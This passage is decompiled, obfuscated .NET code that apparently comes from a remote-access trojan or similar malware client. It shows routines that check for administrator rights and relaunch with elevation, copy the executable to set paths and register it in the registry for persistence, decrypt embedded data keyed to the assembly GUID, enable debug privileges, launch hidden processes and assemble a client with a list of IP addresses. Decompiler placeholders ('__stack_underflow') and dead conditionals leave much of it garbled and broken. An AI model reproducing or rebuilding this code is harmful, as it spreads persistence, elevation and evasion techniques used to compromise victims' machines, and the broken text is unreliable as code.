    #=qdPDxrK7XRQZlwY8QeW6oe0AEoOr3qND_WVi1o6l48tc=(#=qy_aVo5ze7CCnCYXCQvhVBg==);
    local9 = local4.ReadBytes(local4.ReadInt32());
    local7 = #=qXULhMbqiur_al62NrjaiXWJ8rme0bKMO8KkV356NZwk=(local9);
    local8 = new System.Object[((*local7[local6]) - 1) + 1];
    local6 = local6 + 1;
    System.Array.Copy(local7, local6, local8, 0, checked((int)local8.Length));
    local6 = local6 + checked((int)local8.Length);
    local10 = new System.Object[((*local7[local6]) - 1) + 1];
    local6 = local6 + 1;
    System.Array.Copy(local7, local6, local10, 0, checked((int)local10.Length));
    #=qP6OAxyfxw$Mj0oVKCDnh2VZfwY2Ap_uDBmUyxkn98Eo=(local10);
    #=q99eEsMLSp2$EVfl66Ua2d1YMqB58RPj30lLgJzJJ64o=(local8);
    return true;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qP6OAxyfxw$Mj0oVKCDnh2VZfwY2Ap_uDBmUyxkn98Eo=(object[] arg1)
{
    int local0;
    string local1;
    object local2;
    int local3;

    if (4 != 0)
    {
        local3 = __stack_underflow;
    }
    if (6 != 0)
    {
        local0 = __stack_underflow;
    }
    while (local0 <= local3)
    {
        if (4 != 0)
        {
            local1 = __stack_underflow;
        }
        local2 = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg1[local0 + 1]);
        if (!#=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=.ContainsKey(local1))
        {
            #=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=.Add(local1, System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(local2));
            local0 = local0 + 2;
            continue;
        }
        else
        {
            #=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=[local1] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(local2);
            local0 = local0 + 2;
            continue;
        }
        local0 = local0 + 2;
        continue;
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q99eEsMLSp2$EVfl66Ua2d1YMqB58RPj30lLgJzJJ64o=(object[] arg1)
{
    int local0;
    #=qDOdV5duF980CDFSFl8oQpw== local1;
    int local2;

    if (checked((int)arg1.Length) == 0)
    {
        return;
    }
    if (0 == 0)
    {
        #=qJLXxSZzWSVDQjBBC8RxpqVbwxFaxTu3ygaLrjLvlmTw= = __stack_underflow;
    }
    if (8 != 0)
    {
        #=qmbdg4P9$2ouafwS8nEs4lA== = __stack_underflow;
    }
    if (3 != 0)
    {
        #=qN9Enun6Rlq30xNdBjhzY0A== = __stack_underflow;
    }
    local2 = checked((int)arg1.Length) - 1;
    local0 = 2;
    while (local0 <= local2)
    {
        local1 = default(#=qDOdV5duF980CDFSFl8oQpw==);
        (&local1).#=qsB4PatedVyMOyo9s5n1OTA== = *arg1[local0];
        (&local1).#=qG8K0lOrmHWfP2KExoNv$5w== = *arg1[local0 + 1];
        (&local1).#=qEIGjjvppBA3BShbdBfMkQQ== = (String)arg1[local0 + 2];
        (&local1).#=q3$9MQ9O56ldzMJGDeTdBZw== = (byte[])arg1[local0 + 3];
        (&local1).#=q__Bys7JTXmAiG9F9QC$wjw== = #=q8d8q1KZbTCKTAZreko1Lug==((&local1).#=q3$9MQ9O56ldzMJGDeTdBZw==);
        #=qzjreg8z0D4BPrx4RxUJBoQ==.Add((&local1).#=qsB4PatedVyMOyo9s5n1OTA==, local1);
        local0 = local0 + 4;
        continue;
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static byte[] #=qiNB6YyqAJbx2uPAiP1Ihw9dTNEtwaZElmpYLZcGO64Q=()
{
    byte[] local0;
    nint local1;
    nint local3;
    nint local4;
    int local5;

    if (1 != 0)
    {
        local3 = __stack_underflow;
    }
    if (local3 == Zero)
    {
        return null;
    }
    if (-1 != 0)
    {
        local1 = __stack_underflow;
    }
    if (local1 == Zero)
    {
        return null;
    }
    if (3 != 0)
    {
        local5 = __stack_underflow;
    }
    if (local5 == 0)
    {
        return null;
    }
    local4 = #=q12n1704BGxiT9AoOoTNqog==(local1);
    if (local4 == Zero)
    {
        return null;
    }
    local0 = new System.Byte[(local5 - 1) + 1];
    System.Runtime.InteropServices.Marshal.Copy(local4, local0, 0, checked((int)local0.Length));
    return local0;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q8fYxP$_i6Xk0$6OlSwUHKcvhrevHxLXqXqvszBe9OtM=()
{
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static System.Guid #=q0QKFCbf0u_IpV5ISOWOl$Q==(System.Reflection.Assembly arg1)
{
    System.Guid local1;

    local1.ctor(((GuidAttribute)((1 != 0 ? arg1 : arg1)).GetCustomAttributes(typeof(GuidAttribute), false)[0]).Value);
    return (7 != 0 ? local1 : local1);
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static byte[] #=q8uMGC19QD5WGzpkzUOu0SQ==(byte[] arg1, System.Guid arg2)
{
    System.Security.Cryptography.RijndaelManaged local0;
    System.Security.Cryptography.Rfc2898DeriveBytes local2;

    if (2 != 0)
    {
        local2 = __stack_underflow;
    }
    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    local0.IV = local2.GetBytes(16);
    local0.Key = local2.GetBytes(16);
    return local0.CreateDecryptor().TransformFinalBlock(arg1, 0, checked((int)arg1.Length));
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qr9m9EjuYAP$2E3p2xadfFhcTH6toAhrm0dlfOTldiWRsdXd8UmnkRkYrV_8$1gaA()
{
    System.Exception local0;

    if (!(#=q8Lz$o21atQxw0qUwF07ufqfk8jjJrspNc$L9E2y_kjQA$2GQzuj5BmjDMXRcd0oL()))
    {
        return;
    }
    if (!(!#=q6zjWArzQ8Jv_1waqxSeP8A==()))
    {
        if (0 == 0)
        {
            #=q7_KHECinDx5vq1IBX7p8Ow== = __stack_underflow;
        }
    }
    try
    {
        if (2 != 0)
        {
            #=qxHMqkcY5ri8Rsxs7KCJ8ww== = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qBpzegr6XzkmtwALf7kKPHV3RZVAWYLbYE79PiG2zXYs=()
{
    bool local0;
    int local1;
    int local2;

    if (2 != 0)
    {
        local2 = __stack_underflow;
    }
    if (5 != 0)
    {
        local1 = __stack_underflow;
    }
    while (true)
    {
        if (local1 <= local2)
        {
            if (4 != 0)
            {
                #=qChXzjuiVYrb8OlqJPajoUA== = __stack_underflow;
            }
            if (!local0)
            {
                System.Threading.Thread.Sleep(250);
                local1 = local1 + 250;
                continue;
            }
            return;
        }
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qfvzoVBS4j9KdxyngOlL_NauqVYLAaOZVw9dutKQSAp4=()
{
    if (#=qgPQkZ3GBDc371jzhubcNPqmxfqhr7b78DNmenmuxGa8=() != 0)
    {
        System.Threading.Thread.Sleep(#=qgPQkZ3GBDc371jzhubcNPqmxfqhr7b78DNmenmuxGa8=());
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qwSPuuWVW8tz$gDazhda2d$myXXX0Ro_wRP7Rmm8JiiT9wA1EeeaPUV2jnUkQOCHa()
{
    if (!(#=qui$hq6ka6v3VYA7sCjpJmcmNECKESf33DUzrmeSOmg8_E_GsgWi7VMMVWUGuO5wH()))
    {
        return;
    }
    #=qV9UIxiLyaOi7XoTx2DUJwr8Ior26OirSZwM3mOvftrw=(ExecutablePath);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qp9IgcHwNxIVh4GZl4S2tcJtSz0NII67aXwFNDcdhP63JHe9MNg0kPsAos3IUd98k()
{
    System.Diagnostics.ProcessStartInfo local0;
    System.Exception local1;

    if (!(#=qCoWHlVuoVRMkOzC7RZubJCslkxaEWn9yZiIydECf69$ktj0IPD5wAwC2H5Cc8C$L()))
    {
        return;
    }
    if (!(#=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs=))
    {
        if (2 != 0)
        {
            local0 = __stack_underflow;
        }
        local0.WorkingDirectory = CurrentDirectory;
        local0.Verb = #=q00kXQ$0a$SV9DIgRtf4NWQ==(516956698);
        try
        {
            System.Diagnostics.Process.Start(local0);
            #=q8Bp27fhtrXMmonNxf$9qLbuQQehIBQTdOPDQw07FUyI=();
            return;
        }
        catch (System.Exception ex)
        {
        }
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qF4e058OW__NtTzhWOs1UXEJiHrTSwnIZ3q2u9UaLbo49AZaoog8nMfoDeA9BGVvy()
{
    if (!(#=qp$ZVC1r9spi890l$D7IwEd3faoKeWHvv42mVq8wIIWM=()))
    {
        return;
    }
    if (!#=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs=)
    {
        #=q4rZJEBSRFNm6PYOH7NOLUg==();
    }
    else
    {
        #=qYuHUjnyRYHZqCkKAt0jj_9qFBzmTZKte4i1ou04eBWY=();
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN()
{
    if (!(#=q4P_5NYDHZX9MPbDZuNFOAbRpAmJ2c_TFz8M5ulhIFApTRNfzn3_E1__1$MVw8$WV()))
    {
        return;
    }
    if (2 != 0)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qFTBwGADWl13TibdOa5ODk_Y2qcfMGC4lp4rhrZcE84kZNE6dU4EqEk2ZYKuJAWo9()
{
    if (!(#=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq()))
    {
        return;
    }
    #=qXkgpfghvTKDZGlXBGI4x9veQO4JfjF7GW2ECw9$L3EvyKZGOnziwXE2Xr1EkpRwe(true);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qgbI51haY38WJ4NumXDqnLC_uKv$aRHAyD63c9HgGYzlsFjikAASqT8RCSswEMouz()
{
    string local0;
    string local1;
    string local2;
    string local3;
    string local4;

    if (!(!#=qqs1moO$mYaS72OXOWe0Z6GycslEb6e9Ipoy7ppW0O5abIp05ajv8doqdJZHlN3cK()))
    {
        if (!(#=qq_SehjaC_F9U66vu1NLqjA==))
        {
            return;
        }
        if (4 != 0)
        {
            local0 = __stack_underflow;
        }
        if (!#=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs=)
        {
            local4 = #=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=;
            if (!System.String.Equals(ExecutablePath, local0, (System.StringComparison)3))
            {
                if (!(System.String.Equals(ExecutablePath, #=qnOTCmwQWr6BtiNf9ta8BJg==(), (System.StringComparison)3)))
                {
                    return;
                }
            }
            else
            {
                local4 = System.String.Concat(local4, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516957129));
            }
            if (!(!#=qbbzTfwYbEfmovMRrVY462ipA8X_tt3oO3M_wSSE0I_A=(local4, 10000)))
            {
                #=q8Bp27fhtrXMmonNxf$9qLbuQQehIBQTdOPDQw07FUyI=();
            }
        }
        else
        {
            if (#=qyEH54IW$f9fUJb7FOR8r3vj6e$onLGrpm2VGycjbl9TZJEqkwtA4y4bL9ExOWpiA() == null)
            {
                return;
            }
            if (4 != 0)
            {
                local1 = __stack_underflow;
            }
            if (!(System.String.Equals(ExecutablePath, local0, (System.StringComparison)3)))
            {
                if (7 != 0)
                {
                    local2 = __stack_underflow;
                }
                if (!(!#=qulZN_JfMbEqc2jFbEooALI6mh8tLy9$3NFedHEXAIAw=(#=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=, local2, 10000)))
                {
                    #=qU_ZXXWlv_8PtJY9coDWiH8$dVbE9S$EoqFVRvxhPtE8=(ExecutablePath);
                }
            }
            if (!(!#=qp$ZVC1r9spi890l$D7IwEd3faoKeWHvv42mVq8wIIWM=()))
            {
                local3 = local1.Replace(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957139), local0);
                #=qulZN_JfMbEqc2jFbEooALI6mh8tLy9$3NFedHEXAIAw=(System.String.Concat(#=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516957129)), local3, 10000);
            }
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qVCHxDTr$$bwFMb6i9vBKRZciaa69edA3gsLNOty0RAzCorWRBUh2v0PgySYBEvZ0()
{
    if (!(#=q3TG8MLoZf1Y44PREVW$6m76IGmuYE_BOhC_OTjkQJFtYWwRtSeFqevP9hiteuLfz()))
    {
        return;
    }
    if (!(!System.String.Equals(ExecutablePath, #=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=, (System.StringComparison)3)))
    {
        return;
    }
    if (!(!System.String.Equals(ExecutablePath, #=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=, (System.StringComparison)3)))
    {
        return;
    }
    if (3 != 0)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qul8YRvQj1pWpo4_UxgOSzOBvtncEE$VPCzTeLK_rIz4EnXxineVkwF$lTxruKPxr()
{
    if (!(!#=qRACckQ0ejzlKZgeXX_CPJUyKbl7Zu7QfhWW6eMM03VPusMYB8LREfJZQVcTGHBm_()))
    {
        if (8 != 0)
        {
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=q_WoKv7McWxMc2YtmbiVaCw==()
{
    Microsoft.Win32.RegistryKey local1;

    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    if (local1 != null)
    {
        return Microsoft.VisualBasic.CompilerServices.Conversions.ToInteger(local1.GetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957109), 1)) == 1;
    }
    return true;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qBcRYABJptno3$fpXoMXAvg==()
{
    System.Security.Principal.WindowsPrincipal local1;

    if (!(#=q_WoKv7McWxMc2YtmbiVaCw==()))
    {
        return true;
    }
    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    return local1.IsInRole((System.Security.Principal.WindowsBuiltInRole)544);
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static System.Guid #=qArVl3RpI3eEiVf0qXoqrWw==()
{
    string local1;
    System.Guid local2;

    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    if (!System.String.IsNullOrEmpty(local1))
    {
        local2.ctor(local1);
        return local2;
    }
    return Empty;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static string #=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe(System.Guid arg1)
{
    string local0;
    System.Exception local2;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        System.IO.Directory.CreateDirectory(local0);
        return local0;
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static System.DateTime #=qzB1OZ89gRpxcPckUn_afNY2d0beSpEyl40_4IarIxzM=(string arg1)
{
    System.DateTime local1;
    string local2;
    byte[] local3;
    System.Exception local4;

    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    if (4 != 0)
    {
        local2 = __stack_underflow;
    }
    try
    {
        if (!System.IO.File.Exists(local2))
        {
            System.IO.File.WriteAllBytes(local2, System.BitConverter.GetBytes(local1.ToBinary()));
        }
        else
        {
            if (4 != 0)
            {
                local3 = __stack_underflow;
            }
            local1 = System.DateTime.FromBinary(System.BitConverter.ToInt64(local3, 0));
        }
    }
    catch (System.Exception ex)
    {
    }
    return local1;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static string #=qnOTCmwQWr6BtiNf9ta8BJg==()
{
    string local0;
    string local1;
    string local2;
    System.Exception local3;

    if (7 != 0)
    {
        local1 = __stack_underflow;
    }
    if (!(System.IO.File.Exists(local1)))
    {
        return null;
    }
    try
    {
        if (3 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return null;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qU_ZXXWlv_8PtJY9coDWiH8$dVbE9S$EoqFVRvxhPtE8=(string arg1)
{
    string local0;
    System.Exception local1;

    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        System.IO.File.WriteAllText(local0, arg1);
        return;
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qV9UIxiLyaOi7XoTx2DUJwr8Ior26OirSZwM3mOvftrw=(string arg1)
{
    if (4 != 0)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static Client #=qd3Itd1ELDPHJxhLvt0y1NQ==()
{
    Client local0;
    System.Net.IPAddress local2;
    System.Collections.Generic.List<System.Net.IPAddress> local3;

    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    local0.#=qRxKU0X3UfYwXoOTtDpEVW6z4XRgE1s4V5zOQsfCCSqM=(#=qqsKAc3v0igxVSmn4Feg8q$1tNTWiqtCBpA_xMlgU$f8=());
    local0.#=qm_Podb$DJ6CfxMwMnaj6heXfc210URbSx7p$rJGFPmA=(#=qr1BSJWWt4_gjKhDM1XdrUmEEDWmH$7z1xaJvthJ97EQ=());
    local0.#=qz5nGZygXT2sWR5FWGAcAzA==(#=qScWgGHvDwJ0da_7qXoO28aGE1ea7zp5$XjEJLTXkuHQ=());
    local0.#=q8GRQigucU81Rfg9VpK7PVLcjulhhYVPijYKMm9N3PJs=(#=qDJlWEiuGwuVXAz8yc8z7OaMssRYN4hP9AHespNOmdYHus6_1XkNOC0rqgHeRZksg());
    local0.#=qLEtx_37WeiIPQPYSN8vY0qTNiL_L6nA6vkFQwNlcU2Y=(#=qGHv1IOurZ6januU0XCThS7E6H0kqAtBD9d30RkoHFXM=());
    local0.#=qChHxg92yH05lHO0u7UrDcPo$UK1nFXIjb2DI3pyR0FE=(#=q6pErmyx6x4$YkotXXEXGCt_ysi5JdNm1fpNgnUvZ9LE6EtA8E0TapqXrPnqyBO1x());
    if (!(!#=q6pErmyx6x4$YkotXXEXGCt_ysi5JdNm1fpNgnUvZ9LE6EtA8E0TapqXrPnqyBO1x()))
    {
        if (1 != 0)
        {
            local2 = __stack_underflow;
        }
        if (6 != 0)
        {
            local3 = __stack_underflow;
        }
        if (!(!System.Net.IPAddress.TryParse(#=qNzt$mJakh1Nxv4vDRDjTsa1OVDKMAlRCO__qncxMoXRz8jNE7AWvE0B4WIqANR1p(), out local2)))
        {
            local3.Add(local2);
        }
        if (!(!System.Net.IPAddress.TryParse(#=qrPQtMswclvOlK1AxL1S4K8M$owLGUpQfjJA8CWW$fj1az7m8LFibY8IeMxHKi4wi(), out local2)))
        {
            local3.Add(local2);
        }
        local0.#=qSpdFO0arrQmbwA1JpPKL4TCAmwZYVDNVmpRQ6ryTPgs=(local3.ToArray());
    }
    return local0;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qXkgpfghvTKDZGlXBGI4x9veQO4JfjF7GW2ECw9$L3EvyKZGOnziwXE2Xr1EkpRwe(bool arg1)
{
    int local0;
    int local1;
    System.Exception local2;

    if (!(#=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs=))
    {
        return;
    }
    try
    {
        System.Diagnostics.Process.EnterDebugMode();
        if (arg1)
        {
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qKtJTKEkNf2mJVHcZzSW8iQIcsBglzcJJOkX7V_uB55w=()
{
    if (8 != 0)
    {
    }
    #=q8Bp27fhtrXMmonNxf$9qLbuQQehIBQTdOPDQw07FUyI=();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q8Bp27fhtrXMmonNxf$9qLbuQQehIBQTdOPDQw07FUyI=()
{
    #=qXkgpfghvTKDZGlXBGI4x9veQO4JfjF7GW2ECw9$L3EvyKZGOnziwXE2Xr1EkpRwe(false);
    System.Environment.Exit(0);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qORcQ89THKgijJ1sWRyjf4hLd1g4H_sosI9t_gkVfZ7g=()
{
    System.Threading.Thread.Sleep(#=qhq3FXVXLOItNPwDlpFnTKHk3JkInaJiiSE3uR3jtGH8=());
    #=qyzEuYsQ6u9hwZeR0HeWqvA==();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qyzEuYsQ6u9hwZeR0HeWqvA==()
{
    string local0;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(System.String.Format(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516957200), local0, #=qxJg7RxTW1v5mnt12xXeJiYJv_bcctbtL2BCD5MjDi45Hlz6t8vwDNTv1Rv7tgIct()));
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qw39MYiiaN1XJbqsDq$LgQw==(local0, #=qxJg7RxTW1v5mnt12xXeJiYJv_bcctbtL2BCD5MjDi45Hlz6t8vwDNTv1Rv7tgIct());
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q4N2IYJkFi2VWiCVDKVND$8gixU$DXUcX8F2LiLBxLHw=()
{
    if (System.Threading.Interlocked.Increment(ref #=q4fCxMFfzJ9KgfK61DJRvZ5wDvDfYnqR8bhY6TGq9aRk=) == unchecked((long)1))
    {
        if (8 != 0)
        {
        }
        #=qXkgpfghvTKDZGlXBGI4x9veQO4JfjF7GW2ECw9$L3EvyKZGOnziwXE2Xr1EkpRwe(false);
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qoKFLFqm7bb3VWsU2QKXIQ4_6anGbTCWiZAfrNlgq8fc=()
{
    if (#=q4fCxMFfzJ9KgfK61DJRvZ5wDvDfYnqR8bhY6TGq9aRk= == unchecked((long)0))
    {
        return;
    }
    if (System.Threading.Interlocked.Decrement(ref #=q4fCxMFfzJ9KgfK61DJRvZ5wDvDfYnqR8bhY6TGq9aRk=) == unchecked((long)0))
    {
        if (!(!#=q4P_5NYDHZX9MPbDZuNFOAbRpAmJ2c_TFz8M5ulhIFApTRNfzn3_E1__1$MVw8$WV()))
        {
            #=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN();
        }
        if (!(!#=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq()))
        {
            #=qFTBwGADWl13TibdOa5ODk_Y2qcfMGC4lp4rhrZcE84kZNE6dU4EqEk2ZYKuJAWo9();
        }
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qulZN_JfMbEqc2jFbEooALI6mh8tLy9$3NFedHEXAIAw=(string arg1, string arg2, int arg3)
{
    bool local0;
    string local1;
    System.Diagnostics.ProcessStartInfo local2;
    bool local3;
    string local4;
    System.Diagnostics.Process local5;
    System.Exception local6;

    try
    {
        if (-1 != 0)
        {
            local4 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qbbzTfwYbEfmovMRrVY462ipA8X_tt3oO3M_wSSE0I_A=(string arg1, int arg2)
{
    bool local0;
    string local1;
    System.Diagnostics.ProcessStartInfo local2;
    bool local3;
    System.Diagnostics.Process local4;
    System.Exception local5;

    try
    {
        if (7 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qEn9Mtg$AIqWbq3whj1y5N12e3KXi_NwIIcl2i$FXNSk=(string arg1, int arg2)
{
    bool local0;
    string local1;
    System.Diagnostics.ProcessStartInfo local2;
    bool local3;
    System.Diagnostics.Process local4;
    System.Exception local5;

    try
    {
        if (0 == 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static System.Diagnostics.ProcessStartInfo #=qEKdoqcCD2XVb2atXAIOmL$Gnnk$r2oNLDVsEymHbxMo=(string arg1, string arg2)
{
    System.Diagnostics.ProcessStartInfo local1;

    if (7 != 0)
    {
        local1 = __stack_underflow;
    }
    local1.UseShellExecute = false;
    local1.CreateNoWindow = true;
    local1.WindowStyle = (System.Diagnostics.ProcessWindowStyle)1;
    return local1;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qHJMw55fNEVIiKcc4ry0o7_L9hyz3vS4jgKl3KMX8xGg=(string arg1)
{
    bool local0;
    string local1;
    string local2;
    System.IO.FileStream local3;
    System.Exception local4;

    if (!(System.IO.File.Exists(arg1)))
    {
        return false;
    }
    if (6 != 0)
    {
        local3 = __stack_underflow;
    }
    try
    {
        if (2 != 0)
        {
            local3 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    finally
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q4rZJEBSRFNm6PYOH7NOLUg==()
{
    Microsoft.Win32.RegistryKey local0;
    System.Exception local1;

    try
    {
        if (!#=qmTxGiMA05lTEtoPPV6RFOih4DYS0uxrxPO4vA1H2j6U=())
        {
            System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(#=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=));
            if (!(#=qHJMw55fNEVIiKcc4ry0o7_L9hyz3vS4jgKl3KMX8xGg=(#=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=)))
            {
                System.IO.File.Delete(#=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=);
                System.IO.File.Copy(ExecutablePath, #=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=);
            }
            if (4 != 0)
            {
                local0 = __stack_underflow;
            }
            local0.SetValue(#=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=, #=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=);
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qJqkjp9g96yoxpNS2E$BC00FKleto7dZfN9N5mtLDF4g=()
{
    Microsoft.Win32.RegistryKey local0;
    System.Exception local1;
    System.Exception local2;

    try
    {
        if (2 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    try
    {
        if (!(System.String.Equals(ExecutablePath, #=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=, (System.StringComparison)3)))
        {
            System.IO.File.Delete(#=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8=);
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qYuHUjnyRYHZqCkKAt0jj_9qFBzmTZKte4i1ou04eBWY=()
{
    Microsoft.Win32.RegistryKey local0;
    System.Exception local1;

    try
    {
        System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(#=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=));
        if (!(#=qHJMw55fNEVIiKcc4ry0o7_L9hyz3vS4jgKl3KMX8xGg=(#=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=)))
        {
            System.IO.File.Delete(#=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=);
            System.IO.File.Copy(ExecutablePath, #=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=);
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q2WFu5tRyicebO6UkQga8SbXrngw5YigfLTTVJqQy1qI=()
{
    Microsoft.Win32.RegistryKey local0;
    System.Exception local1;
    System.Exception local2;

    try
    {
        if (0 == 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    try
    {
        if (!(System.String.Equals(ExecutablePath, #=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=, (System.StringComparison)3)))
        {
            System.IO.File.Delete(#=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0=);
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qmTxGiMA05lTEtoPPV6RFOih4DYS0uxrxPO4vA1H2j6U=()
{
    bool local0;
    Microsoft.Win32.RegistryKey local1;
    string local2;
    System.Exception local3;

    try
    {
        if (6 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=q5grPwgEurSn6KutVLS5_oPClPR_aCEdSRk5nKP5bDm4=(object arg1, System.UnhandledExceptionEventArgs arg2)
{
